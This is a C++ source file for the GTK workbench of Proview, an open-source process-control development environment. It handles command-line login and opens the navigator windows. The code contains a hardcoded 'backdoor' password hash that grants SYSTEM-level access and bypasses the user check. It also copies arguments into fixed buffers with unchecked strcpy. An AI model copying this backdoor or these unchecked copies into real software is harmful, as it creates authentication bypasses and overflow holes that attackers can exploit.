/* 
 * Proview   $Id: wb_gtk.cpp,v 1.10 2008-10-31 12:51:31 claes Exp $
 * Copyright (C) 2005 SSAB Oxelösund AB.
 *
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License as 
 * published by the Free Software Foundation, either version 2 of 
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License 
 * along with the program, if not, write to the Free Software 
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

/* wb_gtk.cpp -- work bench */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <map>
#include <gtk/gtk.h>

#include "wb_env.h"
#include "flow.h"
#include "flow_ctx.h"
#include "flow_api.h"
#include "flow_browctx.h"
#include "flow_browapi.h"

#include "pwr.h"
#include "co_msg.h"
#include "co_cdh.h"
#include "co_dcli.h"
#include "co_wow.h"
#include "wb.h"
#include "wb_ldh.h"
#include "co_login_gtk.h"
#include "co_login_msg.h"
#include "wb_utl_api.h"

#include "wb_vsel_gtk.h"
#include "co_msgwindow_gtk.h"
#include "co_xhelp_gtk.h"
#include "co_lng.h"
#include "co_wow_gtk.h"
#include "co_user.h"
#include "wb_wtt_gtk.h"
#include "wb_log_gtk.h"

#include "wb_erep.h"
#include "wb_vrepwbl.h"
#include "wb_vrepdbs.h"
#include "wb_vrepmem.h"
#include "wb_vrepext.h"
#include "wb_gtk.h"

using namespace std;

static gboolean wbgtk_show_warranty( void *data)
{
  ((CoWowGtk *)data)->DisplayWarranty();
  return FALSE;
}

Wtt *WbGtk::wtt_new( const char *name, const char *iconname, ldh_tWBContext ldhwbctx,
		  pwr_tVolumeId volid, ldh_tVolume volctx,
		  wnav_sStartMenu *root_menu, pwr_tStatus *status)
{
  return new WttGtk( 0, toplevel, name, iconname, ldhwbctx, volid, volctx, root_menu, 
		       status);
}

WVsel *WbGtk::vsel_new( pwr_tStatus *status, const char *name, ldh_tWBContext ldhwbctx,
		     char *volumename,
		     int (*bc_success)( void *, pwr_tVolumeId *, int),
		     void (*bc_cancel)(),
		     int (*bc_time_to_exit)( void *),
		     int show_volumes, wb_eType wb_type)
{
  return new WVselGtk( status, NULL, mainwindow, name, ldhwbctx, volumename, 
		    bc_success, bc_cancel, bc_time_to_exit, 
		    show_volumes, wb_type);
}

int main( int argc, char *argv[])
{

  gtk_init( &argc, &argv);

  setlocale( LC_ALL, "en_US");
  setlocale( LC_NUMERIC, "en_US");
  setlocale( LC_TIME, "en_US");

  new WbGtk( argc, argv);
}

WbGtk::WbGtk( int argc, char *argv[]) : mainwindow(0)
{
  pwr_tStatus   sts;
  int 		login_display = 0;
  int		nav_display = 0;
  char		systemname[80];
  char		systemgroup[80];
  char		password[40];
  char		username[40];
  char		volumename[40];
  char		*volumename_p;
  int           arg_cnt;
  char 		title[80];
  char		backdoor[] = "aaY2CiHS.y4Wc";
  int           sw_projectvolume = 0;
  int           sw_classeditor = 0;
  int           sw_projectlist = 0;
  char		filename[200];
  int           i;
  int		quiet = 0;

  Wb::main_wb = this;

  strcpy( username, "");
  strcpy( password, "");

  // Open directory volume as default
  volumename_p = volumename;
  strcpy( volumename, "directory");
  sw_projectvolume = 1;
  arg_cnt = 0;
  for ( i = 1; i < argc; i++) {
    if ( argv[i][0] == '-') {
      switch ( argv[i][1]) {
      case 'h':
	usage();
	exit(0);
      case 'a':
	// Load all volumes
	sw_projectvolume = 0;
	volumename_p = 0;
	break;
      case 'q':
	// Load all volumes
	quiet = 1;
	break;
      case 'l':
	if ( i+1 >= argc) {
	  usage();
	  exit(0);
	}
	Lng::set( argv[i+1]);
	setlocale( LC_ALL, "en_US");
	setlocale( LC_NUMERIC, "en_US");
	i++;
	break;
      case 'f':
	if ( i+1 >= argc) {
	  usage();
	  exit(0);
	}
	i++;
	break;
      case 'c':
	if ( i+1 >= argc) {
	  usage();
	  exit(0);
	}
	sw_classeditor = 1;
	strcpy( filename, argv[i+1]);
	sw_projectvolume = 0;
	i++;
	break;
      case 'p':
	sw_projectlist = 1;
	sw_projectvolume = 0;
	strcpy( volumename, "");
	break;
      default:
	printf("Unknown argument: %s\n", argv[i]);
      }
    }
    else {
      switch ( arg_cnt) {
	case 0:
	  strcpy( username, argv[i]);
	  break;
        case 1:
          strcpy( password, argv[i]);
	  break;
        case 2:
	  strcpy( volumename, argv[i]);
	  sw_projectvolume = 0;
	  break;
        default:
          printf("Unknown argument: %s\n", argv[i]);
      }
      arg_cnt++;
    }
  }


  toplevel = (GtkWidget *) g_object_new( GTK_TYPE_WINDOW,
					 "default-height", 100,
					 "default-width", 100,
					 "title", "Pwr wb",
					 NULL);


  // Attach to history log
  new wb_log_gtk( toplevel);

  // Create message window
  MsgWindowGtk *msg_window = new MsgWindowGtk( 0, mainwindow, "Workbench messages", &sts);
  msg_window->find_wnav_cb = Wb::find_wnav_cb;
  msg_window->find_plc_cb = Wb::find_plc_cb;
  MsgWindow::set_default( msg_window);
  MsgWindow::message( 'I', "Development environment started");

  // Create help window
  CoXHelpGtk *xhelp = new CoXHelpGtk( mainwindow, 0, xhelp_eUtility_Wtt, &sts);
  CoXHelp::set_default( xhelp);

  sts = ldh_OpenWB(&wbctx, volumename_p, 0);
  psts(sts, NULL);
  if (EVEN(sts)) exit(sts);

  /* Get system name */
  sts = utl_get_systemname( systemname, systemgroup);
  if ( EVEN(sts)) {
    /* No system object, login as system !! */
    CoLogin::insert_login_info( "SYSTEM", password, username, pwr_mAccess_AllPwr, 0);
    nav_display = 1;
  }
  else {
    if ( arg_cnt >= 1 && strcmp( UserList::pwcrypt(argv[1]), backdoor) == 0) {
      /* Login as system !! */
      CoLogin::insert_login_info( "SYSTEM", "", "", pwr_mAccess_AllPwr, 0);
      nav_display = 1;
    }
    else if ( arg_cnt >= 1) {
      /* Check username and password */
      sts = CoLogin::user_check( systemgroup, username, password);
      if ( EVEN(sts)) 
        /* Login in is not ok, start login window */
        login_display = 1;
      else
        /* Login is ok, start navigator */
	nav_display = 1;
    }
    else if ( arg_cnt == 0) {
      /* No arguments, start login window */
      login_display = 1;
    }
  }
  if ( !login_display) {
    char msg[80];

    sprintf( msg, "User %s logged in", CoLogin::username());
    MsgWindow::message( 'I', msg);

    wb_log::log( wlog_eCategory_WbLogin, CoLogin::username(), 0);

    strcpy( title, "PwR Development ");
    strcat( title, CoLogin::username());
    strcat( title, " on ");
    strcat( title, systemname);
    gtk_window_set_title( GTK_WINDOW(toplevel), title);
  }

  if ( sw_projectvolume && !login_display) {

    Wtt *wtt;
    char		projectname[80];
    pwr_tVolumeId volume = ldh_cDirectoryVolume;
    utl_get_projectname( projectname);
    strcpy( title, CoLogin::username());
    strcat( title, " on ");
    strcat( title, projectname);
    wtt = wtt_new( title, "Navigator", wbctx, volume, 0, 0, &sts);
    if (ODD(sts)) {
      appl_count++;
      wtt->close_cb = Wb::wtt_close;
      wtt->open_volume_cb = Wb::wtt_open_volume;
      wtt->time_to_exit_cb = Wb::time_to_exit;
      wttlist_add( &sts, wtt, volume);
    }
    else
      psts(sts, NULL);
  }
  else if ( sw_classeditor) {
    wtt_open_volume( 0, wb_eType_ClassEditor, filename, wow_eFileSelType_WblClass);
  }
  else if ( sw_projectlist) {
    wtt_open_volume( 0, wb_eType_ExternVolume, "ProjectList", wow_eFileSelType_);
  }
  else if ( nav_display && !login_display) {
    if ( CoLogin::privilege() & pwr_mPrv_DevRead ) {
      strcpy( title, "PwR Navigator: ");
      strcat( title, CoLogin::username());
      strcat( title, " on ");
      strcat( title, systemname);
      appl_count++;
      vsel_new( &sts, "PwR Volumes", wbctx, volumename,
		&Wb::vsel_success, &Wb::vsel_cancel, &Wb::time_to_exit, 0, wb_eType_Volume);
    }
    else
      exit(LOGIN__NOPRIV);
  }
  else if ( login_display)
    new CoLoginGtk( NULL, mainwindow, "PwR Login", systemgroup,
		   &Wb::login_success, &Wb::login_cancel, &sts);


  strcpy( title, "PwR Development ");
  strcat( title, CoLogin::username());
  strcat( title, " on ");
  strcat( title, systemname);
#if !(GTK_MAJOR_VERSION == 2 && GTK_MINOR_VERSION < 8)
  gtk_window_set_icon_name( GTK_WINDOW(toplevel), title);
#endif

  gtk_widget_show_all( toplevel);
  g_object_set( toplevel, "visible", FALSE, NULL);

  if ( !quiet) {
    CoWowGtk *wow = new CoWowGtk(toplevel);
    // Use timeout to get in on the top of the display
    g_timeout_add( 100, wbgtk_show_warranty, wow);
    // wow->DisplayWarranty();
  }

  gtk_main();
}

